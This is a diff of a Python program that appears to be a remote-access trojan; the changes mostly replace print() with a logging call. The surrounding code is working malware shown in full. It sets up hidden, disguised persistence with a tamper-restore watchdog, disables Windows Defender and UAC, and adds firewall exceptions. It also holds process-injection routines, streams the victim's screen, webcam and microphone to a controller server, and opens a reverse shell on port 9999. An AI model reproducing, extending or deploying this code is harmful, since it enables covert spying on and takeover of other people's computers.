@@ -2150,11 +2278,11 @@ def self_deploy_powershell():
         if hasattr(sys, 'frozen') and sys.frozen:
             # Running as compiled executable (PyInstaller)
             current_exe = sys.executable
-            print(f"[DEBUG] Running as compiled exe: {current_exe}")
+            log_message(f"[DEBUG] Running as compiled exe: {current_exe}")
         else:
             # Running as Python script
             current_exe = os.path.abspath(__file__)
-            print(f"[DEBUG] Running as Python script: {current_exe}")
+            log_message(f"[DEBUG] Running as Python script: {current_exe}")
         
         # Check if already deployed
         stealth_path = os.path.join(
@@ -2165,7 +2293,7 @@ def self_deploy_powershell():
         )
         
         if os.path.exists(stealth_path):
-            print("[INFO] Already deployed to stealth location")
+            log_message("Already deployed to stealth location")
             # Still check if registry entry exists
             try:
                 import winreg
@@ -2173,10 +2301,11 @@ def self_deploy_powershell():
                                    r"Software\Microsoft\Windows\CurrentVersion\Run")
                 value, _ = winreg.QueryValueEx(key, "svchost32")
                 winreg.CloseKey(key)
-                print(f"[INFO] Registry entry exists: {value}")
+                log_message(f"Registry entry exists: {value}")
+                DEPLOYMENT_COMPLETED = True
                 return True
             except:
-                print("[WARN] Registry entry missing, will recreate...")
+                log_message("Registry entry missing, will recreate...", "warning")
                 # Continue with deployment
         
         # Define stealth paths
@@ -2204,7 +2333,7 @@ def self_deploy_powershell():
             # Copy compiled executable
             shutil.copy2(current_exe, stealth_path)
             shutil.copy2(current_exe, backup_path)
-            print(f"[OK] Executable copied to stealth locations")
+            log_message(f"[OK] Executable copied to stealth locations")
         else:
             # For Python script, create batch wrappers
             stealth_batch = stealth_path.replace('.exe', '.bat')
@@ -2219,7 +2348,7 @@ def self_deploy_powershell():
                 
             stealth_path = stealth_batch
             backup_path = backup_batch
-            print(f"[OK] Batch wrappers created for Python script")
+            log_message(f"[OK] Batch wrappers created for Python script")
         
         # Set hidden attributes
         subprocess.run(['attrib', '+s', '+h', stealth_path], 
@@ -2227,8 +2356,8 @@ def self_deploy_powershell():
         subprocess.run(['attrib', '+s', '+h', backup_path], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] Executable deployed to: {stealth_path}")
-        print(f"[OK] Backup created at: {backup_path}")
+        log_message(f"[OK] Executable deployed to: {stealth_path}")
+        log_message(f"[OK] Backup created at: {backup_path}")
         
         # Add to registry using PowerShell
         powershell_script = f'''
@@ -2257,7 +2386,7 @@ Write-Host "Registry persistence established"
         except:
             pass
         
-        print("[OK] Registry persistence established")
+        log_message("[OK] Registry persistence established")
         
         # Create tamper protection
         tamper_script = f'''
@@ -2278,7 +2407,7 @@ def check_and_restore():
                 # Restore from backup
                 if os.path.exists(backup_exe):
                     shutil.copy2(backup_exe, main_exe)
-                    print(f"Restored executable from {{backup_exe}}")
+                    log_message(f"Restored executable from {{backup_exe}}")
                     
                     # Restart executable
                     subprocess.Popen([main_exe], 
@@ -2287,7 +2416,7 @@ def check_and_restore():
             time.sleep(60)  # Check every minute
             
         except Exception as e:
-            print(f"Tamper protection error: {{e}}")
+            log_message(f"Tamper protection error: {{e}}")
             time.sleep(120)
 
 if __name__ == "__main__":
@@ -2303,22 +2432,23 @@ if __name__ == "__main__":
         subprocess.Popen(['python.exe', tamper_script_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print("[OK] Tamper protection active")
+        log_message("[OK] Tamper protection active")
         
-        print("\n" + "="*80)
-        print("SELF-DEPLOYMENT COMPLETE")
-        print("="*80)
-        print(f"Executable deployed to: {stealth_path}")
-        print(f"Backup created at: {backup_path}")
-        print("Registry persistence established")
-        print("Tamper protection active")
-        print("Executable will start on next login")
-        print("="*80)
+        log_message("\n" + "="*80)
+        log_message("SELF-DEPLOYMENT COMPLETE")
+        log_message("="*80)
+        log_message(f"Executable deployed to: {stealth_path}")
+        log_message(f"Backup created at: {backup_path}")
+        log_message("Registry persistence established")
+        log_message("Tamper protection active")
+        log_message("Executable will start on next login")
+        log_message("="*80)
         
+        DEPLOYMENT_COMPLETED = True
         return True
         
     except Exception as e:
-        print(f"Self-deployment failed: {e}")
+        log_message(f"Self-deployment failed: {e}")
         return False
         
         # Create stealth deployment location
@@ -2340,7 +2470,7 @@ if __name__ == "__main__":
         subprocess.run(['attrib', '+s', '+h', stealth_location], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] Executable deployed to: {stealth_location}")
+        log_message(f"[OK] Executable deployed to: {stealth_location}")
         
         # Create registry persistence
         try:
@@ -2352,7 +2482,7 @@ if __name__ == "__main__":
             winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
             winreg.CloseKey(key)
             
-            print("[OK] Registry persistence established")
+            log_message("[OK] Registry persistence established")
             
             # Also add to RunOnce for immediate execution
             runonce_key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
@@ -2360,12 +2490,12 @@ if __name__ == "__main__":
             winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
             winreg.CloseKey(key)
             
-            print("[OK] RunOnce persistence established")
+            log_message("[OK] RunOnce persistence established")
             
         except PermissionError:
-            print("[WARN] Registry access denied - persistence may not work")
+            log_message("[WARN] Registry access denied - persistence may not work", "warning")
         except Exception as e:
-            print(f"[WARN] Registry persistence failed: {e}")
+            log_message(f"[WARN] Registry persistence failed: {e}")
         
         # Create additional backup in different location
         backup_location = os.path.join(
@@ -2380,7 +2510,7 @@ if __name__ == "__main__":
         subprocess.run(['attrib', '+s', '+h', backup_location], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
         
-        print(f"[OK] Backup created at: {backup_location}")
+        log_message(f"[OK] Backup created at: {backup_location}")
         
         # Create tamper protection for the deployed executable
         tamper_script = f'''
@@ -2401,7 +2531,7 @@ def check_and_restore():
                 # Restore from backup
                 if os.path.exists(backup_exe):
                     shutil.copy2(backup_exe, main_exe)
-                    print(f"Restored executable from {{backup_exe}}")
+                    log_message(f"Restored executable from {{backup_exe}}")
                     
                     # Restart executable
                     subprocess.Popen([main_exe], 
@@ -2410,7 +2540,7 @@ def check_and_restore():
             time.sleep(60)  # Check every minute
             
         except Exception as e:
-            print(f"Tamper protection error: {{e}}")
+            log_message(f"Tamper protection error: {{e}}")
             time.sleep(120)
 
 if __name__ == "__main__":
@@ -2431,9 +2561,9 @@ if __name__ == "__main__":
                 tamper_script_path
             ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=300)  # 5 minute timeout
         except subprocess.TimeoutExpired:
-            print("[WARN] Tamper protection build timed out, continuing without it")
+            log_message("[WARN] Tamper protection build timed out, continuing without it", "warning")
         except Exception as e:
-            print(f"[WARN] Failed to build tamper protection: {e}")
+            log_message(f"[WARN] Failed to build tamper protection: {e}")
         
         # Move tamper protection to stealth location
         tamper_exe = os.path.join('dist', 'tamper_protection.exe')
@@ -2452,22 +2582,22 @@ if __name__ == "__main__":
             subprocess.Popen([stealth_tamper], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
-            print(f"[OK] Tamper protection deployed: {stealth_tamper}")
+            log_message(f"[OK] Tamper protection deployed: {stealth_tamper}")
         
-        print("\n" + "="*80)
-        print("DEPLOYMENT COMPLETE")
-        print("="*80)
-        print(f"Executable deployed to: {stealth_location}")
-        print(f"Backup created at: {backup_location}")
-        print("Registry persistence established")
-        print("Tamper protection active")
-        print("Executable will start on next login")
-        print("="*80)
+        log_message("\n" + "="*80)
+        log_message("DEPLOYMENT COMPLETE")
+        log_message("="*80)
+        log_message(f"Executable deployed to: {stealth_location}")
+        log_message(f"Backup created at: {backup_location}")
+        log_message("Registry persistence established")
+        log_message("Tamper protection active")
+        log_message("Executable will start on next login")
+        log_message("="*80)
         
         return True
         
     except Exception as e:
-        print(f"Deployment failed: {e}")
+        log_message(f"Deployment failed: {e}")
         return False
 
 def disable_defender():
@@ -2494,7 +2624,7 @@ def disable_defender():
         return False
         
     except Exception as e:
-        print(f"Failed to disable Defender: {e}")
+        log_message(f"Failed to disable Defender: {e}")
         return False
 
 def disable_defender_registry():
@@ -2526,13 +2656,13 @@ def disable_defender_registry():
         return True
         
     except Exception as e:
-        print(f"Registry Defender disable failed: {e}")
+        log_message(f"Registry Defender disable failed: {e}")
         return False
 
 def disable_defender_powershell():
     """Disable Windows Defender via PowerShell commands."""
     if not WINDOWS_AVAILABLE:
-        print("PowerShell Defender disable: Windows not available")
+        log_message("PowerShell Defender disable: Windows not available")
         return False
         
     try:
@@ -2558,7 +2688,7 @@ def disable_defender_powershell():
             except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                 continue
             except Exception as e:
-                print(f"PowerShell command failed: {e}")
+                log_message(f"PowerShell command failed: {e}")
                 continue
         
         # Add exclusions for common paths
@@ -2579,19 +2709,19 @@ def disable_defender_powershell():
             except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                 continue
             except Exception as e:
-                print(f"PowerShell exclusion failed: {e}")
+                log_message(f"PowerShell exclusion failed: {e}")
                 continue
         
         return True
         
     except Exception as e:
-        print(f"PowerShell Defender disable failed: {e}")
+        log_message(f"PowerShell Defender disable failed: {e}")
         return False
 
 def disable_defender_group_policy():
     """Disable Windows Defender via Group Policy modifications."""
     if not WINDOWS_AVAILABLE:
-        print("Group Policy Defender disable: Windows not available")
+        log_message("Group Policy Defender disable: Windows not available")
         return False
         
     try:
@@ -2613,19 +2743,19 @@ def disable_defender_group_policy():
             except (PermissionError, OSError, FileNotFoundError):
                 continue
             except Exception as e:
-                print(f"Registry key modification failed: {e}")
+                log_message(f"Registry key modification failed: {e}")
                 continue
         
         return True
         
     except Exception as e:
-        print(f"Group Policy Defender disable failed: {e}")
+        log_message(f"Group Policy Defender disable failed: {e}")
         return False
 
 def disable_defender_service():
     """Disable Windows Defender services."""
     if not WINDOWS_AVAILABLE:
-        print("Service Defender disable: Windows not available")
+        log_message("Service Defender disable: Windows not available")
         return False
         
     try:
@@ -2654,13 +2784,13 @@ def disable_defender_service():
             except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                 continue
             except Exception as e:
-                print(f"Service disable failed for {service}: {e}")
+                log_message(f"Service disable failed for {service}: {e}")
                 continue
         
         return True
         
     except Exception as e:
-        print(f"Service Defender disable failed: {e}")
+        log_message(f"Service Defender disable failed: {e}")
         return False
 
 def advanced_process_hiding():
@@ -2681,7 +2811,7 @@ def advanced_process_hiding():
         return True
         
     except Exception as e:
-        print(f"Advanced process hiding failed: {e}")
+        log_message(f"Advanced process hiding failed: {e}")
         return False
 
 def hollow_process():
@@ -2719,7 +2849,7 @@ def hollow_process():
         return True
         
     except Exception as e:
-        print(f"Process hollowing failed: {e}")
+        log_message(f"Process hollowing failed: {e}")
         return False
 
 def inject_into_trusted_process():
@@ -2778,7 +2908,7 @@ def inject_into_trusted_process():
         return False
         
     except Exception as e:
-        print(f"Process injection failed: {e}")
+        log_message(f"Process injection failed: {e}")
         return False
 
 def process_doppelganging():
@@ -2815,7 +2945,7 @@ def process_doppelganging():
         return False
         
     except Exception as e:
-        print(f"Process doppelganging failed: {e}")
+        log_message(f"Process doppelganging failed: {e}")
         return False
 
 def advanced_persistence():
@@ -2841,7 +2971,7 @@ def advanced_persistence():
         return True
         
     except Exception as e:
-        print(f"Advanced persistence failed: {e}")
+        log_message(f"Advanced persistence failed: {e}")
         return False
 
 def setup_service_persistence():
@@ -2869,7 +2999,7 @@ def setup_service_persistence():
         return True
         
     except Exception as e:
-        print(f"Service persistence failed: {e}")
+        log_message(f"Service persistence failed: {e}")
         return False
 
 def setup_scheduled_task_persistence():
@@ -2894,13 +3024,13 @@ def setup_scheduled_task_persistence():
         return True
         
     except Exception as e:
-        print(f"Scheduled task persistence failed: {e}")
+        log_message(f"Scheduled task persistence failed: {e}")
         return False
 
 def setup_wmi_persistence():
     """Setup persistence via WMI event subscription."""
     if not WINDOWS_AVAILABLE:
-        print("WMI persistence: Windows not available")
+        log_message("WMI persistence: Windows not available")
         return False
         
     try:
@@ -2933,16 +3063,16 @@ $WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "
         return True
         
     except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
-        print("WMI persistence: PowerShell execution failed")
+        log_message("WMI persistence: PowerShell execution failed")
         return False
     except Exception as e:
-        print(f"WMI persistence failed: {e}")
+        log_message(f"WMI persistence failed: {e}")
         return False
 
 def setup_com_hijacking_persistence():
     """Setup persistence via COM hijacking."""
     if not WINDOWS_AVAILABLE:
-        print("COM hijacking persistence: Windows not available")
+        log_message("COM hijacking persistence: Windows not available")
         return False
         
     try:
@@ -2964,10 +3094,10 @@ def setup_com_hijacking_persistence():
         return True
         
     except (PermissionError, OSError, FileNotFoundError):
-        print("COM hijacking persistence: Registry access failed")
+        log_message("COM hijacking persistence: Registry access failed")
         return False
     except Exception as e:
-        print(f"COM hijacking persistence failed: {e}")
+        log_message(f"COM hijacking persistence failed: {e}")
         return False
 
 def add_firewall_exception():
@@ -2994,9 +3124,9 @@ def add_firewall_exception():
                 f'program={current_exe}'
             ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
             success = True
-            print(f"[OK] Firewall exception added: {rule_name}")
+            log_message(f"[OK] Firewall exception added: {rule_name}")
         except subprocess.CalledProcessError as e:
-            print(f"[WARN] Method 1 failed: {e}")
+            log_message(f"[WARN] Method 1 failed: {e}")
         
         # Method 2: Try with just python.exe if Method 1 failed
         if not success:
@@ -3008,9 +3138,9 @@ def add_firewall_exception():
                     'program=python.exe'
                 ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
                 success = True
-                print(f"[OK] Firewall exception added (python.exe): {rule_name}")
+                log_message(f"[OK] Firewall exception added (python.exe): {rule_name}")
             except subprocess.CalledProcessError as e:
-                print(f"[WARN] Method 2 failed: {e}")
+                log_message(f"[WARN] Method 2 failed: {e}")
         
         # Method 3: Try with PowerShell if netsh fails
         if not success:
@@ -3020,17 +3150,17 @@ def add_firewall_exception():
                     'powershell.exe', '-Command', powershell_cmd
                 ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
                 success = True
-                print(f"[OK] Firewall exception added via PowerShell: {rule_name}")
+                log_message(f"[OK] Firewall exception added via PowerShell: {rule_name}")
             except subprocess.CalledProcessError as e:
-                print(f"[WARN] Method 3 failed: {e}")
+                log_message(f"[WARN] Method 3 failed: {e}")
         
         if not success:
-            print("[WARN] All firewall exception methods failed. Continuing without firewall exception.")
+            log_message("[WARN] All firewall exception methods failed. Continuing without firewall exception.", "warning")
         
         return success
         
     except Exception as e:
-        print(f"[ERROR] Failed to add firewall exception: {e}")
+        log_message(f"[ERROR] Failed to add firewall exception: {e}")
         return False
 
 def hide_process():
@@ -3056,7 +3186,7 @@ def hide_process():
         return True
         
     except Exception as e:
-        print(f"Failed to hide process: {e}")
+        log_message(f"Failed to hide process: {e}")
         return False
 
 def disable_uac():
@@ -3072,16 +3202,16 @@ def disable_uac():
             winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
             winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
-        print("[OK] UAC has been disabled.")
+        log_message("[OK] UAC has been disabled.")
         return True
     except PermissionError:
-        print("[!] Access denied. Run this script as administrator.")
+        log_message("[!] Access denied. Run this script as administrator.")
         return False
     except (OSError, FileNotFoundError):
-        print("[!] Registry access failed.")
+        log_message("[!] Registry access failed.")
         return False
     except Exception as e:
-        print(f"[!] Error disabling UAC: {e}")
+        log_message(f"[!] Error disabling UAC: {e}")
         return False
 def run_as_admin():
     """Relaunch the script with elevated privileges if not already admin."""
@@ -3089,7 +3219,7 @@ def run_as_admin():
         return False
     
     if not is_admin():
-        print("[!] Relaunching as Administrator...")
+        log_message("[!] Relaunching as Administrator...")
         try:
             # Relaunch with elevated privileges
             ctypes.windll.shell32.ShellExecuteW(
@@ -3097,10 +3227,10 @@ def run_as_admin():
             )
             sys.exit()
         except (AttributeError, OSError):
-            print("[!] Failed to relaunch as admin: Windows API not available")
+            log_message("[!] Failed to relaunch as admin: Windows API not available")
             return False
         except Exception as e:
-            print(f"[!] Failed to relaunch as admin: {e}")
+            log_message(f"[!] Failed to relaunch as admin: {e}")
             return False
     return True
 
@@ -3130,10 +3260,10 @@ def setup_persistence():
         return True
         
     except (PermissionError, OSError, FileNotFoundError):
-        print("Failed to setup persistence: Registry access denied")
+        log_message("Failed to setup persistence: Registry access denied")
         return False
     except Exception as e:
-        print(f"Failed to setup persistence: {e}")
+        log_message(f"Failed to setup persistence: {e}")
         return False
 
 def anti_analysis():
@@ -3220,8 +3350,10 @@ def sleep_random_non_blocking():
         sleep_time = random.uniform(0.5, 2.0)
         eventlet.sleep(sleep_time)
     except ImportError:
-        # Fallback to regular sleep if eventlet not available
-        sleep_random()
+        # Fallback to shorter sleep or skip if eventlet not available
+        log_message("eventlet not available for non-blocking sleep, using shorter delay", "warning")
+        sleep_time = random.uniform(0.1, 0.5)  # Much shorter fallback
+        time.sleep(sleep_time)
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -3298,19 +3430,19 @@ def stream_screen(agent_id):
     
     # Check if required dependencies are available
     if not MSS_AVAILABLE:
-        print("Error: mss not available for screen capture")
+        log_message("Error: mss not available for screen capture", "error")
         return
     
     if not NUMPY_AVAILABLE:
-        print("Error: numpy not available for screen capture")
+        log_message("Error: numpy not available for screen capture", "error")
         return
     
     if not CV2_AVAILABLE:
-        print("Error: opencv-python not available for screen capture")
+        log_message("Error: opencv-python not available for screen capture", "error")
         return
     
     # Use the working fallback implementation directly
-    print("Starting screen streaming...")
+    log_message("Starting screen streaming...")
     _stream_screen_fallback(agent_id)
 
 def _stream_screen_fallback(agent_id):
@@ -3322,7 +3454,7 @@ def _stream_screen_fallback(agent_id):
     retry_delay = 5  # seconds
     # Check if required dependencies are available
     if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
-        print("Error: Required dependencies not available for screen capture")
+        log_message("Error: Required dependencies not available for screen capture", "error")
         return
     url = f"{SERVER_URL}/stream/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
@@ -3331,7 +3463,7 @@ def _stream_screen_fallback(agent_id):
             with mss.mss() as sct:
                 monitors = sct.monitors
                 monitor_index = 1
-                print(f"Using monitor {monitor_index}: {monitors[monitor_index]}")
+                log_message(f"Using monitor {monitor_index}: {monitors[monitor_index]}")
                 target_fps = 30
                 frame_time = 1.0 / target_fps
                 last_frame_hash = None
@@ -3365,11 +3497,11 @@ def _stream_screen_fallback(agent_id):
                     try:
                         response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.1)
                         if response.status_code != 200:
-                            print(f"Warning: Server returned status {response.status_code}")
+                            log_message(f"Warning: Server returned status {response.status_code}")
                     except requests.exceptions.Timeout:
                         pass
                     except requests.exceptions.RequestException as e:
-                        print(f"Request error: {e}. Retrying in {retry_delay}s...")
+                        log_message(f"Request error: {e}. Retrying in {retry_delay}s...")
                         time.sleep(retry_delay)
                         break  # Break inner loop to retry outer
                     elapsed = time.time() - current_time
@@ -3377,7 +3509,7 @@ def _stream_screen_fallback(agent_id):
                     if sleep_time > 0:
                         time.sleep(sleep_time)
         except Exception as e:
-            print(f"Screen capture initialization error: {e}. Retrying in {retry_delay}s...")
+            log_message(f"Screen capture initialization error: {e}. Retrying in {retry_delay}s...")
             time.sleep(retry_delay)
 
 def stream_camera(agent_id):
@@ -3388,7 +3520,7 @@ def stream_camera(agent_id):
     import time
     retry_delay = 5
     if not CV2_AVAILABLE:
-        print("Error: opencv-python not available for camera capture")
+        log_message("Error: opencv-python not available for camera capture", "error")
         return
     url = f"{SERVER_URL}/camera/{agent_id}"
     headers = {'Content-Type': 'image/jpeg'}
@@ -3400,16 +3532,16 @@ def stream_camera(agent_id):
                 try:
                     cap = cv2.VideoCapture(0, backend)
                     if cap.isOpened():
-                        print(f"Camera opened successfully with backend {backend}")
+                        log_message(f"Camera opened successfully with backend {backend}")
                         break
                     else:
                         cap.release()
                 except Exception as e:
-                    print(f"Failed to open camera with backend {backend}: {e}")
+                    log_message(f"Failed to open camera with backend {backend}: {e}")
                     if cap:
                         cap.release()
             if not cap or not cap.isOpened():
-                print("Error: Could not open camera with any backend. Retrying in {retry_delay}s...")
+                log_message("Error: Could not open camera with any backend. Retrying in {retry_delay}s...", "error")
                 time.sleep(retry_delay)
                 continue
             cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
@@ -3419,14 +3551,14 @@ def stream_camera(agent_id):
             actual_width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
             actual_height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
             actual_fps = cap.get(cv2.CAP_PROP_FPS)
-            print(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
+            log_message(f"Camera initialized: {actual_width}x{actual_height} @ {actual_fps}fps")
             frame_count = 0
             start_time = time.time()
             while CAMERA_STREAMING_ENABLED:
                 try:
                     ret, frame = cap.read()
                     if not ret:
-                        print("Error: Could not read frame from camera")
+                        log_message("Error: Could not read frame from camera", "error")
                         time.sleep(0.1)
                         continue
                     frame_count += 1
@@ -3440,25 +3572,25 @@ def stream_camera(agent_id):
                     try:
                         response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                         if response.status_code != 200:
-                            print(f"Warning: Camera stream server returned status {response.status_code}")
+                            log_message(f"Warning: Camera stream server returned status {response.status_code}")
                     except requests.exceptions.Timeout:
                         pass
                     except requests.exceptions.RequestException as e:
-                        print(f"Camera stream request error: {e}. Retrying in {retry_delay}s...")
+                        log_message(f"Camera stream request error: {e}. Retrying in {retry_delay}s...")
                         time.sleep(retry_delay)
                         break
                     if frame_count % 30 == 0:
                         elapsed = time.time() - start_time
                         fps = frame_count / elapsed
-                        print(f"Camera streaming at {fps:.1f} FPS")
+                        log_message(f"Camera streaming at {fps:.1f} FPS")
                     time.sleep(1/30)
                 except Exception as e:
-                    print(f"Camera stream error: {e}")
+                    log_message(f"Camera stream error: {e}")
                     time.sleep(0.5)
             cap.release()
-            print("Camera streaming stopped")
+            log_message("Camera streaming stopped")
         except Exception as e:
-            print(f"Camera initialization error: {e}. Retrying in {retry_delay}s...")
+            log_message(f"Camera initialization error: {e}. Retrying in {retry_delay}s...")
             time.sleep(retry_delay)
 
 def stream_audio(agent_id):
@@ -3469,7 +3601,7 @@ def stream_audio(agent_id):
     import time
     retry_delay = 5
     if not PYAUDIO_AVAILABLE or FORMAT is None:
-        print("Error: PyAudio not available for audio capture")
+        log_message("Error: PyAudio not available for audio capture", "error")
         return
     url = f"{SERVER_URL}/audio/{agent_id}"
     while AUDIO_STREAMING_ENABLED:
@@ -3483,21 +3615,21 @@ def stream_audio(agent_id):
                         input_devices.append((i, device_info['name']))
                 except Exception:
                     continue
-            print(f"Available input devices: {len(input_devices)}")
+            log_message(f"Available input devices: {len(input_devices)}")
             for idx, name in input_devices:
-                print(f"  Device {idx}: {name}")
+                log_message(f"  Device {idx}: {name}")
             input_device_index = None
             try:
                 default_device_info = p.get_default_input_device_info()
-                print(f"Default audio device: {default_device_info['name']}")
+                log_message(f"Default audio device: {default_device_info['name']}")
                 input_device_index = default_device_info['index']
             except Exception as e:
-                print(f"Could not get default audio device: {e}")
+                log_message(f"Could not get default audio device: {e}")
                 if input_devices:
                     input_device_index = input_devices[0][0]
-                    print(f"Using first available device: {input_devices[0][1]}")
+                    log_message(f"Using first available device: {input_devices[0][1]}")
             if input_device_index is None:
-                print("Error: No audio input devices available. Retrying in {retry_delay}s...")
+                log_message("Error: No audio input devices available. Retrying in {retry_delay}s...", "error")
                 p.terminate()
                 time.sleep(retry_delay)
                 continue
@@ -3510,9 +3642,9 @@ def stream_audio(agent_id):
                     frames_per_buffer=CHUNK,
                     input_device_index=input_device_index
                 )
-                print(f"Audio stream opened successfully with device {input_device_index}")
+                log_message(f"Audio stream opened successfully with device {input_device_index}")
             except Exception as e:
-                print(f"Failed to open audio stream: {e}. Retrying in {retry_delay}s...")
+                log_message(f"Failed to open audio stream: {e}. Retrying in {retry_delay}s...")
                 p.terminate()
                 time.sleep(retry_delay)
                 continue
@@ -3525,26 +3657,26 @@ def stream_audio(agent_id):
                     try:
                         response = requests.post(url, data=data, timeout=1)
                         if response.status_code != 200:
-                            print(f"Warning: Audio stream server returned status {response.status_code}")
+                            log_message(f"Warning: Audio stream server returned status {response.status_code}")
                     except requests.exceptions.Timeout:
                         pass
                     except requests.exceptions.RequestException as e:
-                        print(f"Audio stream request error: {e}. Retrying in {retry_delay}s...")
+                        log_message(f"Audio stream request error: {e}. Retrying in {retry_delay}s...")
                         time.sleep(retry_delay)
                         break
                     if frame_count % 100 == 0:
                         elapsed = time.time() - start_time
                         fps = frame_count / elapsed
-                        print(f"Audio streaming at {fps:.1f} FPS")
+                        log_message(f"Audio streaming at {fps:.1f} FPS")
                 except Exception as e:
-                    print(f"Audio stream error: {e}")
+                    log_message(f"Audio stream error: {e}")
                     break
             stream.stop_stream()
             stream.close()
             p.terminate()
-            print("Audio streaming stopped")
+            log_message("Audio streaming stopped")
         except Exception as e:
-            print(f"Audio initialization error: {e}. Retrying in {retry_delay}s...")
+            log_message(f"Audio initialization error: {e}. Retrying in {retry_delay}s...")
             AUDIO_STREAMING_ENABLED = False
             time.sleep(retry_delay)
 
@@ -3555,7 +3687,7 @@ def start_streaming(agent_id):
         STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
         STREAM_THREAD.daemon = True
         STREAM_THREAD.start()
-        print("Started video stream.")
+        log_message("Started video stream.")
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD
@@ -3565,7 +3697,7 @@ def stop_streaming():
             # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             STREAM_THREAD.join(timeout=2)
         STREAM_THREAD = None
-        print("Stopped video stream.")
+        log_message("Stopped video stream.")
 
 def start_audio_streaming(agent_id):
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
@@ -3574,7 +3706,7 @@ def start_audio_streaming(agent_id):
         AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
         AUDIO_STREAM_THREAD.daemon = True
         AUDIO_STREAM_THREAD.start()
-        print("Started audio stream.")
+        log_message("Started audio stream.")
 
 def stop_audio_streaming():
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
@@ -3584,7 +3716,7 @@ def stop_audio_streaming():
             # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             AUDIO_STREAM_THREAD.join(timeout=2)
         AUDIO_STREAM_THREAD = None
-        print("Stopped audio stream.")
+        log_message("Stopped audio stream.")
 
 def start_camera_streaming(agent_id):
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
@@ -3593,7 +3725,7 @@ def start_camera_streaming(agent_id):
         CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
         CAMERA_STREAM_THREAD.daemon = True
         CAMERA_STREAM_THREAD.start()
-        print("Started camera stream.")
+        log_message("Started camera stream.")
 
 def stop_camera_streaming():
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
@@ -3603,7 +3735,7 @@ def stop_camera_streaming():
             # WARNING: If the thread is stuck in a blocking call, join may not terminate it cleanly.
             CAMERA_STREAM_THREAD.join(timeout=2)
         CAMERA_STREAM_THREAD = None
-        print("Stopped camera stream.")
+        log_message("Stopped camera stream.")
 
 # --- Reverse Shell Functions ---
 
@@ -3628,17 +3760,17 @@ def reverse_shell_handler(agent_id):
                 # Assume it's just a hostname
                 controller_host = SERVER_URL.split(":")[0].split("/")[0]
         except Exception as e:
-            print(f"Error parsing SERVER_URL: {e}")
+            log_message(f"Error parsing SERVER_URL: {e}")
             controller_host = "localhost"  # Fallback
         
         controller_port = 9999  # Dedicated port for reverse shell
         
-        print(f"Attempting reverse shell connection to {controller_host}:{controller_port}")
+        log_message(f"Attempting reverse shell connection to {controller_host}:{controller_port}")
         
         # Set socket timeout
         REVERSE_SHELL_SOCKET.settimeout(10)
         REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
-        print(f"Reverse shell connected to {controller_host}:{controller_port}")
+        log_message(f"Reverse shell connected to {controller_host}:{controller_port}")
         
         # Send initial connection info
         system_info = {
@@ -3655,18 +3787,18 @@ def reverse_shell_handler(agent_id):
                 # Receive command from controller
                 data = REVERSE_SHELL_SOCKET.recv(4096)
                 if not data:
-                    print("No data received from controller, breaking connection")
+                    log_message("No data received from controller, breaking connection")
                     break
                     
                 command = data.decode().strip()
                 if not command:
                     continue
                     
-                print(f"Received command: {command}")
+                log_message(f"Received command: {command}")
                 
                 # Handle special commands
                 if command.lower() == "exit":
-                    print("Received exit command")
+                    log_message("Received exit command")
                     break
                 elif command.startswith("cd "):
                     try:
@@ -3717,17 +3849,17 @@ def reverse_shell_handler(agent_id):
                 try:
                     REVERSE_SHELL_SOCKET.send(response.encode())
                 except Exception as e:
-                    print(f"Error sending response: {e}")
+                    log_message(f"Error sending response: {e}")
                     break
                 
             except socket.timeout:
                 continue
             except Exception as e:
-                print(f"Reverse shell error: {e}")
+                log_message(f"Reverse shell error: {e}")
                 break
                 
     except Exception as e:
-        print(f"Reverse shell connection error: {e}")
+        log_message(f"Reverse shell connection error: {e}")
     finally:
         if REVERSE_SHELL_SOCKET:
             try:
@@ -3735,7 +3867,7 @@ def reverse_shell_handler(agent_id):
             except:
                 pass
         REVERSE_SHELL_SOCKET = None
-        print("Reverse shell disconnected")
+        log_message("Reverse shell disconnected")
 
